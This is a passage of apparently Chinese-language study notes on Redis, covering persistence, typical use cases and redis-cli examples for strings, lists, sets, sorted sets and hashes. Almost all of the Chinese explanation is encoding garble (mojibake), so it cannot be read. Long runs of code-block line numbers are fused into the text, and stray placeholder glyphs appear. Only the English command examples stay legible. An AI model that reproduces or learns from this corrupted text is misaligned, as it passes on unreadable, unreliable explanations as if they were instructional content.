è¿‡æœŸï¼Œæ”¯æŒé«˜å¯ç”¨é›†ç¾¤ç­‰ç­‰ç‰¹æ€§ã€‚ 5ã€æ•°æ®æŒä¹…åŒ–æœºåˆ¶ æŒä¹…åŒ–æœºåˆ¶æœ‰ä¸¤ç§ï¼š1ã€RDB æ–¹å¼ï¼šå®šæœŸå°†å†…å­˜æ•°æ® dump åˆ°ç£ç›˜ 2ã€AOF(append only file)æŒä¹…åŒ–æœºåˆ¶ï¼šç”¨è®°æ—¥å¿—çš„æ–¹å¼è®°å½•æ¯ä¸€æ¡æ•°æ®æ›´æ–°æ“ä½œï¼Œä¸€æ—¦ å‡ºç°ç¾éš¾äº‹ä»¶ï¼Œå¯ä»¥é€šè¿‡æ—¥å¿—é‡æ”¾æ¥æ¢å¤æ•´ä¸ªæ•°æ®åº“ Redisé€‚ç”¨åœºæ™¯1ã€TopN éœ€æ±‚ï¼šå–æœ€æ–°çš„ n ä¸ªæ•°æ®ï¼Œå¦‚è¯»å–ä½œå®¶åšå®¢æœ€æ–°çš„ 50 ç¯‡æ–‡ç« ï¼Œé€šè¿‡ List å®ç°æŒ‰æ—¶ é—´æ’åºçš„æ•°æ®çš„é«˜æ•ˆè·å– 2ã€æ’è¡Œæ¦œåº”ç”¨ï¼šä»¥ç‰¹å®šæ¡ä»¶ä¸ºæ’åºæ ‡å‡†ï¼Œå°†å…¶è®¾æˆ sorted set çš„ scoreï¼Œè¿›è€Œå®ç°é«˜æ•ˆè·å– 3ã€éœ€è¦ç²¾å‡†è®¾å®šè¿‡æœŸæ—¶é—´çš„åº”ç”¨ï¼šæŠŠ sorted set çš„ score å€¼è®¾ç½®æˆè¿‡æœŸæ—¶é—´çš„æ—¶é—´æˆ³ï¼Œé‚£ä¹ˆ å°±å¯ä»¥ç®€å•åœ°é€šè¿‡è¿‡æœŸæ—¶é—´æ’åºï¼Œå®šæ—¶æ¸…é™¤è¿‡æœŸæ•°æ®äº† 4ã€è®¡æ•°å™¨åº”ç”¨ï¼šRedis çš„å‘½ä»¤éƒ½æ˜¯åŸå­æ€§çš„ï¼Œå¯ä»¥è½»æ¾åœ°åˆ©ç”¨ INCRï¼ŒDECR å‘½ä»¤æ¥æ„å»ºè®¡æ•° å™¨ç³»ç»Ÿã€‚ 5ã€å»é™¤å¤§é‡æ•°æ®ä¸­çš„é‡å¤æ•°æ®ï¼šå°†æ•°æ®æ”¾å…¥ set ä¸­ï¼Œå°±èƒ½å®ç°å¯¹é‡å¤æ•°æ®çš„æ’é™¤ 6ã€æ„å»ºé˜Ÿåˆ—ç³»ç»Ÿï¼šä½¿ç”¨ list å¯ä»¥æ„å»ºé˜Ÿåˆ—ç³»ç»Ÿï¼Œä½¿ç”¨ sorted set ç”šè‡³å¯ä»¥æ„å»ºæœ‰ä¼˜å…ˆçº§çš„é˜Ÿ åˆ—ç³»ç»Ÿã€‚ 7ã€å®æ—¶ç³»ç»Ÿï¼Œååƒåœ¾ç³»ç»Ÿï¼šé€šè¿‡ä¸Šé¢è¯´åˆ°çš„ set åŠŸèƒ½ï¼Œä½ å¯ä»¥çŸ¥é“ä¸€ä¸ªç»ˆç«¯ç”¨æˆ·æ˜¯å¦è¿›è¡Œ äº†æŸä¸ªæ“ä½œï¼Œå¯ä»¥æ‰¾åˆ°å…¶æ“ä½œçš„é›†åˆå¹¶è¿›è¡Œåˆ†æç»Ÿè®¡å¯¹æ¯”ç­‰ã€‚ 8ã€Publish/SubScribe æ„å»ºå®æ—¶æ¶ˆæ¯ç³»ç»Ÿ 9ã€ç¼“å­˜ï¼ˆä¼šè¯ï¼Œå•†å“åˆ—è¡¨ï¼Œè¯„è®ºåˆ—è¡¨ï¼Œç»å¸¸æŸ¥è¯¢çš„æ•°æ®ç­‰ï¼‰ 3.RedisåŸºæœ¬æ“ä½œå…·ä½“è§æ–‡æ¡£ ä¹Ÿå¯ä»¥æŸ¥è¯¢ç½‘ç«™ 3.1 å­—ç¬¦ä¸²3.1.1 String shellString ç±»å‹æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ã€‚æ„æ€æ˜¯ Redis çš„ String å¯ä»¥åŒ…å«ä»»ä½•æ•°æ®ã€‚æ¯”å¦‚ jpg å›¾ç‰‡æˆ–è€…åº åˆ—åŒ–çš„å¯¹è±¡ ã€‚ String ç±»å‹æ˜¯ Redis æœ€åŸºæœ¬çš„æ•°æ®ç±»å‹ï¼Œä¸€ä¸ªé”®æœ€å¤§èƒ½å­˜å‚¨ 512MBã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243å¦‚æœç»™å®šäº† NX é€‰é¡¹ï¼Œé‚£ä¹ˆå‘½ä»¤ä»…åœ¨é”® key ä¸å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œæ‰è¿›è¡Œè®¾ç½®æ“ä½œï¼›å¦‚æœé”® key å·²ç»å­˜ åœ¨ï¼Œé‚£ä¹ˆ SET ... NX å‘½ä»¤ä¸åšåŠ¨ä½œï¼ˆä¸ä¼šè¦†ç›–æ—§å€¼ï¼‰ã€‚===&gt; not existå¦‚æœç»™å®šäº† XX é€‰é¡¹ï¼Œé‚£ä¹ˆå‘½ä»¤ä»…åœ¨é”® key å·²ç»å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œæ‰è¿›è¡Œè®¾ç½®æ“ä½œï¼›å¦‚æœé”® key ä¸å­˜ åœ¨ï¼Œé‚£ä¹ˆ SET ... XX å‘½ä»¤ä¸åšåŠ¨ä½œï¼ˆä¸€å®šä¼šè¦†ç›–æ—§å€¼ï¼‰ã€‚# ç®€å•å­˜å–----------------------------------------------------------------------å¤æ‚åº¦ä¸º O(1) ã€‚redis&gt; SET msg "hello world" OKredis&gt; GET msghello world# åˆ é™¤del key1 key2 ... Keyn--------------------------------------------------------------------ä½œç”¨: åˆ é™¤1ä¸ªæˆ–å¤šä¸ªé”®è¿”å›å€¼: ä¸å­˜åœ¨çš„keyå¿½ç•¥æ‰,è¿”å›çœŸæ­£åˆ é™¤çš„keyçš„æ•°é‡# ç»™key è®¾ç½®æ–°å€¼rename key newkey------------------------------------------------------------------------ä½œç”¨: ç»™keyèµ‹ä¸€ä¸ªæ–°çš„keyåæ³¨:å¦‚æœnewkeyå·²å­˜åœ¨,åˆ™newkeyçš„åŸå€¼è¢«è¦†ç›–# multi å­˜å–----------------------------------------------------------------------# ä¸­é—´çš„åˆ†éš”ç¬¦æ˜¯è‡ªå·±æŒ‡å®šçš„127.0.0.1:6379&gt; mset ss::name "airpoet" ss::age "a8" ss::like "ycy"OK127.0.0.1:6379&gt; mget ss::name ss::age ss::like1) "airpoet"2) "a8"3) "ycy"127.0.0.1:6379&gt; mset ss.age "18" ss.teacher "noone"OK127.0.0.1:6379&gt; mget ss.age ss::age1) "18"2) "a8"# msetnx----------------------------------------------------------------------åªæœ‰åœ¨æ‰€æœ‰ç»™å®šé”®éƒ½ä¸å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œ MSETNX ä¼šä¸ºæ‰€æœ‰ç»™å®šé”®è®¾ç½®å€¼ï¼Œæ•ˆæœå’ŒåŒæ—¶æ‰§è¡Œå¤šä¸ª SETNX ä¸€æ ·ã€‚å¦‚æœç»™å®šçš„é”®è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯å­˜åœ¨çš„ ï¼Œé‚£ä¹ˆ MSETNX å°†ä¸æ‰§è¡Œä»»ä½•è®¾ç½®æ“ä½œã€‚redis&gt; MSETNX nx-1 "hello" nx-2 "world" nx-3 "good luck" 1redis&gt; SET ex-key "bad key here"OKredis&gt; MSETNX nx-4 "apple" nx-5 "banana" ex-key "cherry" nx-6 "durian" 0# è®¾ç½®æ–°å€¼å¹¶è¿”å›æ—§å€¼GETSET key new-value------------------------------------------------------------------------------------# å…ˆè®¾ç½®redis&gt; SET getset-str "i'm old value"OK# è®¾ç½®æ–°çš„å€¼, è¿”å›æ—§å€¼redis&gt; GETSET getset-str "i'm new value" i'm old value# é‡æ–° get ä¸€ä¸‹, å‘ç°å·²æ˜¯æ–°å€¼redis&gt; GET getset-str i'm new value#è¿½åŠ å†…å®¹åˆ°å­—ç¬¦ä¸²æœ«å°¾APPEND key value------------------------------------------------------------------------------------redis&gt; SET myPhone "nokia" OKredis&gt; APPEND myPhone "-1110" (integer) 10redis&gt; GET myPhone "nokia-1110"#è¿”å›å€¼çš„é•¿åº¦------------------------------------------------------------------------------------redis&gt; SET msg "hello" OK redis&gt; STRLEN msg (integer) 5 redis&gt; APPEND msg " world" (integer) 11 redis&gt; STRLEN msg (integer) 11==========================================================================================# ç´¢å¼•-------------------------------------------------------------------------------------$ å¦‚æœå­—ç¬¦ä¸²é•¿åº¦ä¸º nä»å·¦åˆ°å³&gt;&gt; 0 ~ n-1ä»å³åˆ°åš&gt;&gt; -1 ~ -n # èŒƒå›´è®¾ç½®SETRANGE key index value-------------------------------------------------------------------------------------ä»ç´¢å¼• index å¼€å§‹ï¼Œç”¨ value è¦†å†™(overwrite)ç»™å®šé”® key æ‰€å‚¨å­˜çš„å­—ç¬¦ä¸²å€¼ã€‚åªæ¥å—æ­£æ•°ç´¢å¼•ã€‚redis&gt; SET msg "hello"OKredis&gt; SETRANGE msg 1 "appy" (integer) 5redis&gt; GET msg "happy"# èŒƒå›´å–å€¼GETRANGE key start end-------------------------------------------------------------------------------------è¿”å›é”® key å‚¨å­˜çš„å­—ç¬¦ä¸²å€¼ä¸­ï¼Œä½äº start å’Œ end ä¸¤ä¸ªç´¢å¼•ä¹‹é—´çš„å†…å®¹(é—­åŒºé—´ï¼Œstart å’Œ end ä¼šè¢«åŒ…æ‹¬ åœ¨å†…)ã€‚å’Œ SETRANGE åªæ¥å—æ­£æ•°ç´¢å¼•ä¸åŒï¼Œ GETRANGE çš„ç´¢å¼•å¯ä»¥æ˜¯æ­£æ•°æˆ–è€… è´Ÿæ•°ã€‚redis&gt; SET msg "hello world"OKredis&gt; GETRANGE msg 0 4 "hello"# ä»åå¾€å‰å–èŒƒå›´, ä¾ç„¶æ˜¯ä»å·¦å¾€å³(ä»å‰å¾€å)è¯»çš„redis&gt; GETRANGE msg -5 -1 "world"==========================================================================================# æ•°å­—æ“ä½œ-------------------------------------------------------------------------------------åªè¦å‚¨å­˜åœ¨å­—ç¬¦ä¸²é”®é‡Œé¢çš„å€¼å¯ä»¥è¢«è§£é‡Šä¸º 64 ä½æ•´æ•°ï¼Œæˆ–è€… IEEE-754 æ ‡å‡†çš„ 64 ä½æµ®ç‚¹æ•°ï¼Œé‚£ä¹ˆç”¨æˆ·å°±å¯ä»¥å¯¹è¿™ä¸ªå­—ç¬¦ä¸²é”®æ‰§è¡Œé’ˆå¯¹æ•°å­—å€¼çš„å‘½ä»¤ã€‚ # å¢åŠ æˆ–è€…å‡å°‘æ•°å­—çš„å€¼ INCRBY, DECRBYå¯å®ç°æ¡ˆä¾‹: è®¡æ•°å™¨(counter), id ç”Ÿæˆå™¨ # é”® num ä¸å­˜åœ¨ï¼Œå‘½ä»¤å…ˆå°† num çš„å€¼åˆå§‹åŒ–ä¸º 0 ,ç„¶åå†æ‰§è¡ŒåŠ  100 æ“ä½œ redis&gt; INCRBY num 100 (integer) 100 redis&gt; DECRBY num 50 (integer) 50 # æµ®ç‚¹æ•°çš„è‡ªå¢å’Œè‡ªå‡INCRBYFLOAT key incrementå‡çš„è¯ ç”¨è´Ÿæ•°-------------------------------------------------------------------------------------redis&gt; SET num 10OKredis&gt; INCRBYFLOAT num 3.14 "13.14"redis&gt; INCRBYFLOAT num -2.04 "11.1"å³ä½¿å­—ç¬¦ä¸²é”®å‚¨å­˜çš„æ˜¯æ•°å­—å€¼ï¼Œå®ƒä¹Ÿå¯ä»¥æ‰§è¡Œ APPENDã€STRLENã€SETRANGE å’Œ GETRANGEå½“ç”¨æˆ·é’ˆå¯¹ä¸€ä¸ªæ•°å­—å€¼æ‰§è¡Œè¿™äº›å‘½ä»¤çš„æ—¶å€™ï¼ŒRedis ä¼šå…ˆå°†æ•°å­—å€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç„¶åå†æ‰§è¡Œå‘½ä»¤ã€‚ ==========================================================================================# äºŒè¿›åˆ¶çš„æ“ä½œç´¢å¼•æ˜¯ä»å³å¾€å·¦é€’å¢ å…·ä½“æŸ¥çœ‹åº”ç”¨æ¡ˆä¾‹: å®ç°åœ¨çº¿äººæ•°ç»Ÿè®¡åº”ç”¨æ¡ˆä¾‹: ä½¿ç”¨ Redis ç¼“å­˜çƒ­é—¨å›¾ç‰‡(äºŒè¿›åˆ¶)https://app.yinxiang.com/shard/s37/nl/7399077/92dcb5fb-c005-45dc-bcc5-d00863c08f84/==========================================================================================# å‚¨å­˜ä¸­æ–‡æ—¶çš„æ³¨æ„äº‹é¡¹--------------------------------------------ä¸€ä¸ªè‹±æ–‡å­—ç¬¦åªéœ€è¦ä½¿ç”¨ å•ä¸ªå­—èŠ‚æ¥å‚¨å­˜ï¼Œè€Œä¸€ä¸ªä¸­æ–‡å­—ç¬¦å´éœ€è¦ä½¿ç”¨å¤šä¸ªå­— èŠ‚æ¥å‚¨å­˜ã€‚STRLENã€SETRANGE å’Œ GETRANGE éƒ½æ˜¯ä¸ºè‹±æ–‡è®¾ç½®çš„ï¼Œå®ƒä»¬åªä¼šåœ¨å­—ç¬¦ä¸ºå•ä¸ªå­—èŠ‚çš„æƒ…å†µä¸‹æ­£å¸¸ å·¥ä½œï¼Œè€Œä¸€æ—¦æˆ‘ä»¬å‚¨å­˜çš„æ˜¯ç±»ä¼¼ä¸­æ–‡è¿™æ ·çš„å¤šå­—èŠ‚å­—ç¬¦ï¼Œé‚£ä¹ˆè¿™ä¸‰ä¸ªå‘½ä»¤å°±ä¸å†é€‚ç”¨äº†ã€‚# åœ¨ redis-cli ä¸­ä½¿ç”¨ä¸­æ–‡æ—¶ï¼Œå¿…é¡»æ‰“å¼€ --raw é€‰é¡¹ï¼Œæ‰èƒ½æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡$ redis-cli --raw$ redis&gt; SET msg "ä¸–ç•Œä½ å¥½" OK$ redis&gt; GET msg ä¸–ç•Œä½ å¥½# strlen åªèƒ½è·å–å­—èŠ‚$redis&gt; STRLEN msg 12==========================================================================================# ç§»åŠ¨åº“move key db(æ³¨æ„: ä¸€ä¸ªredisè¿›ç¨‹,æ‰“å¼€äº†ä¸æ­¢ä¸€ä¸ªæ•°æ®åº“, é»˜è®¤æ‰“å¼€16ä¸ªæ•°æ®åº“,ä»0åˆ°15ç¼–å·,å¦‚æœæƒ³æ‰“å¼€æ›´å¤šæ•°æ®åº“,å¯ä»¥ä»é…ç½®æ–‡ä»¶ä¿®æ”¹)---------------------------------------------------------------------------redis 127.0.0.1:6379[1]&gt; select 2OKredis 127.0.0.1:6379[2]&gt; keys *(empty list or set)redis 127.0.0.1:6379[2]&gt; select 0OKredis 127.0.0.1:6379&gt; keys *1) "name"2) "cc"3) "a"4) "b"# ç§»åŠ¨key åˆ°å…¶å®ƒçš„åº“redis 127.0.0.1:6379&gt; move cc 2(integer) 1redis 127.0.0.1:6379&gt; select 2OKredis 127.0.0.1:6379[2]&gt; keys *1) "cc"redis 127.0.0.1:6379[2]&gt; get cc"3"ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿# æ’å…¥å’Œè¯»å–ä¸€æ¡ String ç±»å‹çš„æ•°æ®127.0.0.1:6379&gt; set name huangboOK127.0.0.1:6379&gt; get name"huangbo"127.0.0.1:6379&gt;------------------------#å¯¹ string ç±»å‹æ•°æ®è¿›è¡Œå¢å‡ï¼ˆå‰ææ˜¯è¿™æ¡æ•°æ®çš„ value å¯ä»¥çœ‹æˆæ•°å­—ï¼‰127.0.0.1:6379&gt; set number 10OK127.0.0.1:6379&gt; incr number(integer) 11127.0.0.1:6379&gt; decr number(integer) 10127.0.0.1:6379&gt; incrby number 10(integer) 20127.0.0.1:6379&gt; decrby number 5(integer) 15------------------------# ä¸€æ¬¡æ€§æ’å…¥æˆ–è€…è·å–å¤šæ¡æ•°æ®127.0.0.1:6379&gt; mset name huangbo age 18 facevalue 99OK127.0.0.1:6379&gt; mget name age facevalue1) "huangbo"2) "18"3) "99"------------------------# åœ¨æ’å…¥ä¸€æ¡ string ç±»å‹æ•°æ®çš„åŒæ—¶ä¸ºå®ƒæŒ‡å®šä¸€ä¸ªå­˜æ´»æœŸé™è§£é‡Š: è¡¨ç¤º yu çš„ jiyi åªæœ‰ 7sï¼Œ7s ä¹‹åä¼šè‡ªåŠ¨æ¸…é™¤è¿™ä¸ª key-value127.0.0.1:6379&gt; setex yu 7 jiyiOK127.0.0.1:6379&gt; get yu"jiyi"127.0.0.1:6379&gt; get yu(nil) 3.1.2 String ä½¿ç”¨æ¡ˆä¾‹è§ github 3.2 list 3.2.1 Listå¸¸ç”¨æ“ä½œç¤ºä¾‹1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# ä»å¤´éƒ¨ï¼ˆå·¦è¾¹leftï¼‰æ’å…¥æ•°æ®127.0.0.1:6379&gt; lpush names huangbo xuzheng wangbaoqiang(integer) 3127.0.0.1:6379&gt; lrange names 0 -11) "wangbaoqiang"2) "xuzheng"3) "huangbo"# ä»å°¾éƒ¨ï¼ˆå³è¾¹rightï¼‰æ’å…¥æ•°æ®127.0.0.1:6379&gt; rpush names ycy cy y(integer) 6# è¯»å– list ä¸­æŒ‡å®šèŒƒå›´çš„ values ==&gt; å¥½åƒä¸æ”¯æŒè´Ÿæ•°ç´¢å¼• ??==&gt; ç´¢å¼•æ˜¯é—­åŒºé—´127.0.0.1:6379&gt; lrange names 0 -11) "wangbaoqiang"2) "xuzheng"3) "huangbo"4) "ycy"5) "cy"6) "y"127.0.0.1:6379&gt; LRANGE names 0 01) "wangbaoqiang"# ä»å¤´éƒ¨(å‰é¢)å¼¹å‡ºä¸€ä¸ªå…ƒç´ 127.0.0.1:6379&gt; lpop names"wangbaoqiang"127.0.0.1:6379&gt; LRANGE names 0 -11) "xuzheng"2) "huangbo"3) "ycy"4) "cy"5) "y"# ä»å°¾éƒ¨(æœ€åright)å¼¹å‡ºä¸€ä¸ªå…ƒç´ 127.0.0.1:6379&gt; rpop names"y"127.0.0.1:6379&gt; LRANGE names 0 -11) "xuzheng"2) "huangbo"3) "ycy"4) "cy"# ä»å‰é¢ list çš„å°¾éƒ¨(right)å¼¹å‡º(pop)ä¸€ä¸ªå…ƒç´  å‹å…¥(push)åˆ° åé¢ listçš„ å¤´éƒ¨(left) -----------------------------------127.0.0.1:6379&gt; LRANGE names 0 -11) "xuzheng"2) "huangbo"3) "ycy"4) "cy"127.0.0.1:6379&gt; LRANGE nickname 0 -11) "YangChaoyue"2) "WuXuanyi"3) "MengMeiqi"127.0.0.1:6379&gt; ï£¿ RPOPLPUSH names nickname ï£¿"cy"127.0.0.1:6379&gt; LRANGE nickname 0 -11) "cy"2) "YangChaoyue"3) "WuXuanyi"4) "MengMeiqi"127.0.0.1:6379&gt; LRANGE names 0 -11) "xuzheng"2) "huangbo"3) "ycy"# æ±‚ list çš„é•¿åº¦ 3.2.2 liståº”ç”¨æ¡ˆä¾‹ä»£ç è§ github 3.3 Set é›†åˆ3.3.1 Set çš„ shell ä½¿ç”¨Redis çš„ Set æ˜¯ string ç±»å‹çš„æ— åºé›†åˆã€‚ é›†åˆæ˜¯é€šè¿‡å“ˆå¸Œè¡¨å®ç°çš„ï¼Œæ‰€ä»¥æ·»åŠ ï¼Œåˆ é™¤ï¼ŒæŸ¥æ‰¾çš„å¤æ‚åº¦éƒ½æ˜¯ O(1)ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# æ’å…¥ set æ•°æ® &amp; æŸ¥è¯¢ set æ•°æ®127.0.0.1:6379&gt; sadd bigdata hadoop spark hive(integer) 3127.0.0.1:6379&gt; scard bigdata(integer) 3127.0.0.1:6379&gt; smembers bigdata1) "hadoop"2) "spark"3) "hive"# åˆ¤æ–­ä¸€ä¸ªæˆå‘˜æ˜¯å¦å±äºæŸæ¡æŒ‡å®šçš„ set æ•°æ®127.0.0.1:6379&gt; sismember bigdata hbase(integer) 0127.0.0.1:6379&gt; sismember bigdata hive(integer) 1# æ±‚ä¸¤ä¸ª set æ•°æ®çš„å·®é›†$ setdiff [set1] [set2]&gt; åˆ é™¤ set1 ä¸­ set1,set2çš„äº¤é›†, è¿”å›åˆ é™¤æ“ä½œåçš„ set1(å¯¹ set1 çš„çœŸå®å­˜å‚¨ä¸å½±å“)127.0.0.1:6379&gt; SMEMBERS bigdata1) "hadoop"2) "spark"3) "hive"127.0.0.1:6379&gt; SMEMBERS bigdata21) "hbase"2) "spark"3) "storm"127.0.0.1:6379&gt; sdiff bigdata bigdata21) "hadoop"2) "hive"# å°†ä¸Šé¢2è€…çš„å·®é›†, å­˜å…¥ä¸€ä¸ªæ–°çš„ set127.0.0.1:6379&gt; sdiffstore bigdatadiff bigdata bigdata2(integer) 2127.0.0.1:6379&gt; SMEMBERS bigdatadiff1) "hadoop"2) "hive"# æ±‚äº¤é›† &amp; å­˜å…¥æ–°çš„é›†åˆ127.0.0.1:6379&gt; SMEMBERS bigdata1) "hadoop"2) "spark"3) "hive"127.0.0.1:6379&gt; SMEMBERS bigdata21) "hbase"2) "spark"3) "storm"127.0.0.1:6379&gt; SINTER bigdata bigdata21) "spark"127.0.0.1:6379&gt; SINTERSTORE interdb bigdata bigdata2(integer) 1127.0.0.1:6379&gt; SMEMBERS interdb1) "spark"# æ±‚å¹¶é›† sunion127.0.0.1:6379&gt; SMEMBERS bigdata1) "hadoop"2) "spark"3) "hive"127.0.0.1:6379&gt; SMEMBERS bigdata21) "hbase"2) "spark"3) "storm"# è¿”å›å¹¶é›†127.0.0.1:6379&gt; sunion bigdata bigdata21) "hadoop"2) "spark"3) "hive"4) "storm"5) "hbase"# å­˜å‚¨å¹¶é›†127.0.0.1:6379&gt; SUNIONSTORE uniondb bigdata bigdata2(integer) 5127.0.0.1:6379&gt; SMEMBERS uniondb1) "hadoop"2) "spark"3) "hive"4) "storm"5) "hbase" 3.3.2 set ä½¿ç”¨æ¡ˆä¾‹è§ github 3.4 ZSetâ€“æœ‰åºé›†åˆZset å’Œ Set ä¸€æ ·ä¹Ÿæ˜¯ String ç±»å‹å…ƒç´ çš„é›†åˆï¼Œä¸”ä¸å…è®¸é‡å¤çš„æˆå‘˜ã€‚ ä¸åŒçš„æ˜¯æ¯ä¸ªå…ƒç´ éƒ½ä¼šå…³è”ä¸€ä¸ª double ç±»å‹çš„åˆ†æ•°ã€‚Redis æ­£æ˜¯é€šè¿‡åˆ†æ•°æ¥ä¸ºé›†åˆä¸­çš„æˆå‘˜ è¿›è¡Œä»å°åˆ°å¤§çš„æ’åºã€‚ Zset çš„æˆå‘˜æ˜¯å”¯ä¸€çš„ï¼Œä½†åˆ†æ•°(score)å´å¯ä»¥é‡å¤ã€‚ 3.4.1 zset shellæ“ä½œ1234567891011121314151617181920212223242526272829303132333435363738394041424344# å¾€ redis åº“ä¸­æ’å…¥ä¸€æ¡ sortedset æ•°æ®# æ³¨æ„: scoåœ¨å‰é¢(float), å¯é‡å¤, 'value'ä¸å¯é‡å¤$ zadd [zsetå] sco 'value'127.0.0.1:6379&gt; zadd yanzhi 70 huangbo 90 xuzheng 80 wangbaoqiang(integer) 3# å‡åºæ’åˆ—127.0.0.1:6379&gt; zrange yanzhi 0 41) "huangbo"2) "wangbaoqiang"3) "xuzheng"# é™åºæ’åˆ—127.0.0.1:6379&gt; zrevrange yanzhi 0 41) "xuzheng"2) "wangbaoqiang"3) "huangbo"# æŸ¥è¯¢æŸä¸ªæˆå‘˜çš„åæ¬¡127.0.0.1:6379&gt; zrevrange yanzhi 0 41) "xuzheng"2) "wangbaoqiang"3) "huangbo"127.0.0.1:6379&gt; zrank yanzhi huangbo(integer) 0127.0.0.1:6379&gt; zrank yanzhi wangbaoqiang(integer) 1127.0.0.1:6379&gt; zrank yanzhi xuzheng(integer) 2#ä¿®æ”¹æˆå‘˜çš„åˆ†æ•°zincrby yanzhi 50 huangbo"120"127.0.0.1:6379&gt; ZRANGE yanzhi 0 -11) "wangbaoqiang"2) "xuzheng"3) "huangbo"$ zrevrank è¿”å› huangbo çš„ yanzhi æ’å $ 'value' huangbo ä¸èƒ½é‡å¤, å¯¹åº”çš„åˆ†æ•°å¯ä»¥é‡å¤127.0.0.1:6379&gt; zrevrank yanzhi huangbo(integer) 0 3.4.2 æ¡ˆä¾‹Lol ç›’å­è‹±é›„æ•°æ®æ’è¡Œæ¦œï¼š 1ã€åœ¨ redis ä¸­éœ€è¦ä¸€ä¸ªæ¦œå•æ‰€å¯¹åº”çš„ sortedset æ•°æ® 2ã€ç©å®¶æ¯é€‰æ‹©ä¸€ä¸ªè‹±é›„æ‰“ä¸€åœºæ¸¸æˆï¼Œå°±å¯¹ sortedset æ•°æ®çš„ç›¸åº”çš„è‹±é›„åˆ†æ•°+1 3ã€Lol ç›’å­ä¸ŠæŸ¥çœ‹æ¦œå•æ—¶ï¼Œå°±è°ƒç”¨ zrange æ¥çœ‹æ¦œå•ä¸­çš„æ’åºç»“æœ ä»£ç è§ github 3.5 æ•£åˆ— â€“ Hashâ€“ å“ˆå¸Œè¡¨ä¸€ä¸ªæ•£åˆ—ç”±å¤šä¸ªåŸŸå€¼å¯¹(field-value pair)ç»„æˆï¼Œæ•£åˆ—çš„é”®å’Œå€¼éƒ½å¯ä»¥æ˜¯æ–‡å­—ã€æ•´æ•°ã€æµ®ç‚¹æ•°æˆ–è€…äºŒ è¿›åˆ¶æ•°æ®ã€‚ åŒä¸€ä¸ªæ•£åˆ—é‡Œé¢çš„å„ä¸ªåŸŸå¿… é¡»æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œä½†ä¸åŒåŸŸçš„ å€¼å¯ä»¥æ˜¯é‡å¤çš„ã€‚ å°½é‡ä½¿ç”¨æ•£åˆ—é”®è€Œä¸æ˜¯å­—ç¬¦ä¸²é”®æ¥å‚¨å­˜é”®å€¼å¯¹æ•°æ®ï¼Œå› ä¸ºæ•£åˆ—é”®ç®¡ç†æ–¹ä¾¿ã€èƒ½å¤Ÿé¿å…é”®åå†²çªã€å¹¶ä¸”è¿˜èƒ½å¤ŸèŠ‚çº¦å†…å­˜ã€‚ Redis Hash æ˜¯ä¸€ä¸ªé”®å€¼å¯¹é›†åˆã€‚ Redis Hash ç±»å‹å¯ä»¥çœ‹æˆå…·æœ‰ String Key å’Œ String Value çš„ map å®¹å™¨ Redis Hash æ˜¯ä¸€ä¸ª String ç±»å‹çš„ field å’Œ value çš„æ˜ å°„è¡¨ï¼ŒHash ç‰¹åˆ«é€‚åˆç”¨äºå­˜å‚¨å¯¹è±¡ã€‚ 3.5.1 shell æ“ä½œ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119# æ•£åˆ—(hash)ç±»ä¼¼äº HashMapä¸€ä¸ªæ•£åˆ—ç”±å¤šä¸ªåŸŸ å€¼å¯¹(field-value pair)ç»„æˆï¼Œæ•£åˆ—çš„åŸŸå’Œå€¼éƒ½å¯ä»¥æ˜¯æ–‡å­—ã€æ•´æ•°ã€æµ®ç‚¹æ•°æˆ–è€…äºŒ è¿›åˆ¶æ•°æ®åŒä¸€ä¸ªæ•£åˆ—é‡Œé¢çš„æ¯ä¸ªåŸŸå¿… é¡»æ˜¯ç‹¬ä¸€æ— äºŒã€å„ä¸ç›¸åŒ çš„ï¼Œè€ŒåŸŸçš„å€¼åˆ™æ²¡æœ‰è¿™ä¸€è¦æ±‚ï¼Œæ¢å¥è¯è¯´ï¼Œä¸åŒåŸŸçš„å€¼ å¯ä»¥æ˜¯é‡çš„ã€‚#å…³è”åŸŸå€¼å¯¹HSET key field valueHGET key field:TODO çœŸæ­£çš„ kv æ˜¯ f v, é‚£è®¾ç½®è¿™ä¸ª key å¹²å˜›çš„? ? ğŸ‘Œ===&gt; key æ˜¯æ•£åˆ—åç§°, æ¯”å¦‚ æ•£åˆ— message çš„ field-value pair æ˜¯"sender" "peter" -------------------------------------------------------------------------------------redis&gt; HSET message "id" 10086 (integer) 1redis&gt; HSET message "sender" "peter" (integer) 1redis&gt; HSET message "receiver" "jack" (integer) 1==========================================================================================#ä¸€æ¬¡è®¾ç½®æˆ–è·å–æ•£åˆ—ä¸­çš„å¤šä¸ªåŸŸå€¼å¯¹HMSET key field value [field value ...]HMGET key field [field ...]redis&gt; HMSET message "id" 10086 "sender" "peter" "receiver" "jack"OKredis&gt; HMGET message "id" "sender" "receiver"1) "10086"2) "peter"3) "jack"#è·å–æ•£åˆ—åŒ…å«çš„æ‰€æœ‰åŸŸã€å€¼ã€æˆ–è€…åŸŸå€¼å¯¹HKEYS key =&gt; è¿”å›æ•£åˆ—é”® key åŒ…å«çš„æ‰€æœ‰åŸŸã€‚HVALS key =&gt; è¿”å›æ•£åˆ—é”® key 